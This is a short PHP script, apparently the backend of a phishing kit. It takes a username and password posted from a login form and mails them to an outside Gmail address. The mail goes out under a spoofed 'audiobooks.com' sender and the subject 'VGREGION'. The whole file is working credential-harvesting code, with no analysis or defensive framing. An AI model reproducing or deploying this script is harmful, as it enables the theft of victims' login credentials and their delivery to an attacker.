<?php
$u = $_POST['username'];
$p= $_POST['password'];

$from = 'info@audiobooks.com';
$to = 'fxtoolz489@gmail.com';
$header = "FROM:".$from;
$body = "Username : ".$u."\n"
  . "Password : ".$p."\n"
  . "********************************\n"
  . "";
$subject= "VGREGION";

if(mail($to, $subject, $body, $header)){
	
	echo "success";
}else{
	echo "failed";
}

?>